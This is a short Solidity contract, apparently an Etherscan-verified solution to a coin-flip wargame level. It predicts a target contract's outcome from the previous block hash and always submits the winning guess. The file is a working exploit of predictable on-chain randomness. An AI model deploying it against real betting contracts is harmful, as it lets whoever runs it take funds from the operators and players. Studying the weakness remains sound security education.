/**
 *Submitted for verification at Etherscan.io on 2022-02-06
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.11;

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract CoinFlipHelper {
  ICoinFlip public coinFlip;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor(address _coinFlip) {
    coinFlip = ICoinFlip(_coinFlip);
  }

  function flip() public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number - 1));
    uint256 coinFlipResult = blockValue / FACTOR;
    bool side = coinFlipResult == 1 ? true : false;

    return coinFlip.flip(side);
  }
}